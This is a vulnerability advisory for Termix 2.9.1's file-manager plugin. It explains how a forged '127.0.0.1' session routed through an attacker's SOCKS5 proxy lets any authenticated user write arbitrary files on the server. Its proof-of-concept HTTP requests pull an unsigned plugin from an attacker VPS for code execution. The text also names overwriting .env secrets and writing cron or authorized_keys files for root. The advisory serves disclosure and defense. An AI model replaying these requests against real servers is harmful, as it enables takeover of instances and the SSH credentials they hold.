# Termix (release-2.9.1) File Manager transferToHost Session-IP Confusion — Arbitrary File Write on the Server, RCE via Unsigned Plugin Loading

### Summary

Termix (https://github.com/Termix-SSH/Termix, `release-2.9.1-tag`) ships a file-manager plugin whose host-to-host transfer feature writes to the Termix server's own local filesystem whenever the *destination session* is judged to be "local". The judgment (`isLocalSshEndpoint`, `plugins/file-manager/src/backend/transfer-host-utils.ts:30-37`) is a pure string comparison of the session's `ip` field against localhost/127.0.0.1/::1/the host's own NIC addresses — and that `ip` field is declared verbatim by the caller in `POST /plugin-api/file-manager/connect` (`index.ts:845`). Because the actual SSH connection can be routed through an attacker-controlled SOCKS5 proxy (making the real peer the attacker's VPS, not the host), any ordinary authenticated user can forge a "local" destination session and point `POST /plugin-api/file-manager/transferToHost` (`index.ts:2150-2209`, `destPath` unvalidated) at any path, causing ssh2's `sftp.fastGet` (`transfer-engine.ts:1691`) to create or overwrite arbitrary files **on the Termix server** with backend-process privileges.

Consequences include: planting unsigned `.tmxplug` archives under `DATA_DIR/plugins/` that Termix auto-loads at startup (RCE), overwriting `DATA_DIR/.env` (`JWT_SECRET`/`ENCRYPTION_KEY`) to forge admin JWTs, tampering with `termix.db`, and — in `PUID=0` Docker deployments — writing `/etc/cron.d/` or `/root/.ssh/authorized_keys` for direct root persistence.

Confirmed 2026-10-05 via full source-chain analysis; `verdict: confirmed` in the verification record.

This is CWE-284/CWE-288: Improper Access Control / Authentication Bypass by Alternate Path, escalating to CWE-434 arbitrary file upload (server-side).

### Details

**Root cause and trust boundary failures:**

1. **Session creation trusts the client-declared IP.** `POST /connect` (`plugins/file-manager/src/backend/index.ts`, handler around line 487) writes `body.ip` verbatim into `sshSessions[sessionId]` (lines 838-851); the same body may carry `useSocks5`/`socks5Host`/`socks5Port` (or jump hosts). The subsequent `verifySessionOwnership` check is meaningless — the session belongs to the attacker themselves.
2. **The transport decouples the real peer from the recorded IP.** `openSshTransport()` (`src/backend/hosts/connect/transport.ts:136-147`) routes SSH through `createSocks5Connection(host.ip, host.port, proxyConfig)`; `createSingleProxyConnection()` (`src/backend/utils/proxy-helper.ts:59-94`) hands the target address to the SOCKS5 proxy, which resolves it from *its own* vantage point — `"127.0.0.1"` resolves to the attacker's VPS, not the Termix host. The private-address blocklist (`validateHost`/`isBlockedAddress` in `safe-outbound-fetch.ts`) is enforced only inside `testProxyConnectivity()` (`proxy-helper.ts:307`), never on the actual SSH connection path.
3. **"Destination is local" is a pure string comparison.** `isLocalSshEndpoint()` (`transfer-host-utils.ts:30-37`) returns true when the session IP string equals `localhost`/`127.0.0.1`/`::1` or matches the host's NIC addresses — without checking whether the session was established through a proxy/jump host, and without verifying the peer host key against the local sshd.
4. **Routing into the local direct-write branch.** `transferFileData()` (`transfer-engine.ts:1991-1997`) selects `pipelinedSftpToLocalFile()` when `isLocalSshEndpoint(destSession.ip)`; setting `methodPreference="item_sftp"` in the transfer request forces the per-file path (`transfer-routing.ts:62-76`) so tar optimization cannot alter the route.
5. **Sink — unvalidated path straight to ssh2 fastGet.** `pipelinedSftpToLocalFile()` (`transfer-engine.ts:1898-1945`) computes `const localPath = sftpPathToLocalPath(destPath)` (line 1925; identity for Unix paths per `transfer-paths.ts:142-151`) then calls `promisifyFastGet` (lines 1679-1696) executing `sftp.fastGet(remotePath, localPath, opts, cb)` — ssh2 opens and writes `localPath` on the Termix server with process privileges. `destPath` comes from `POST /transferToHost` with no allowlist, sandbox, or symlink handling.
6. **Escalation to code execution.** Files landing in `DATA_DIR/plugins/*.tmxplug` are auto-loaded at startup by `PluginLoader.loadAll()` (`src/backend/plugins/loader.ts:215-287`); signature enforcement only applies when a `.sig` file sits next to the artifact or `TERMIX_REQUIRE_SIGNED_PLUGINS=true` (lines 307-322) — neither is default. Overwriting `DATA_DIR/.env` (where `system-crypto.ts` persists `JWT_SECRET`, `DATABASE_KEY`, `ENCRYPTION_KEY`, `INTERNAL_AUTH_TOKEN`) enables forged admin JWTs after restart. With `PUID=0`, `docker/entrypoint.sh` keeps the process root; `/etc/cron.d/` or `/root/.ssh/authorized_keys` gives root persistence without a restart.

Core vulnerable code path:

```ts
// transfer-host-utils.ts:30-37 — string comparison only
export const isLocalSshEndpoint = (ip: string): boolean =>
  LOCAL_ADDRESSES.has(ip) || hostNicAddresses.has(ip);

// transfer-engine.ts:1991-1997
if (isLocalSshEndpoint(destSession.ip)) {
  await pipelinedSftpToLocalFile(...);   // skips remote SFTP write
}

// transfer-engine.ts:1925 + 1691
const localPath = sftpPathToLocalPath(destPath);   // destPath: attacker-controlled
await sftp.fastGet(remotePath, localPath, opts, cb); // writes the Termix server FS
```

### PoC

Confirmed 2026-10-05 by chain analysis (source-level, all hops verified against the code):

1. Attacker (ordinary authenticated user) creates a session whose *recorded* IP is `127.0.0.1` while routing through their own SOCKS5:

```http
POST /plugin-api/file-manager/connect
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"host": "<attacker-vps>", "port": 22, "username": "u", "password": "p",
 "ip": "127.0.0.1", "useSocks5": true, "socks5Host": "<attacker-vps>", "socks5Port": 1080}
```

2. Request a transfer of a file residing on the attacker VPS:

```http
POST /plugin-api/file-manager/transferToHost
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"sourceSessionId": "...", "destSessionId": "<the 'local' session>",
 "remotePath": "/tmp/evil.tmxplug", "destPath": "/app/plugins/evil.tmxplug",
 "methodPreference": "item_sftp"}
```

3. `isLocalSshEndpoint("127.0.0.1")` returns true → `pipelinedSftpToLocalFile` → `sftp.fastGet` pulls `/tmp/evil.tmxplug` from the attacker VPS and writes it to `/app/plugins/evil.tmxplug` **on the Termix server**. After the next Termix restart, `PluginLoader` executes the unsigned archive as Node.js code inside the backend.

Alternative direct impact without the plugin stage: `destPath` pointing at `DATA_DIR/.env` or `termix.db` (stop-instance + replace + start) corrupts instance credentials and the user database; with `PUID=0`, `destPath=/etc/cron.d/pwn` yields immediate root.

### Impact

Any ordinary authenticated user can create or overwrite arbitrary paths on the Termix server filesystem with backend-process privileges: (1) unsigned `.tmxplug` implants in `DATA_DIR/plugins/` are auto-loaded at restart, executing arbitrary Node.js code (RCE); (2) overwriting `DATA_DIR/.env` (`JWT_SECRET`/`ENCRYPTION_KEY`) enables forging arbitrary admin JWTs after restart, taking over the instance and all hosted SSH credentials; (3) tampering with `DATA_DIR/termix.db` rewrites the user table for privilege escalation; (4) `PUID=0` Docker deployments run as root, so `/etc/cron.d/` or `/root/.ssh/authorized_keys` provide persistence without restart. In multi-user deployments this breaks the core tenancy model — users must never be able to write the Termix server's own filesystem.
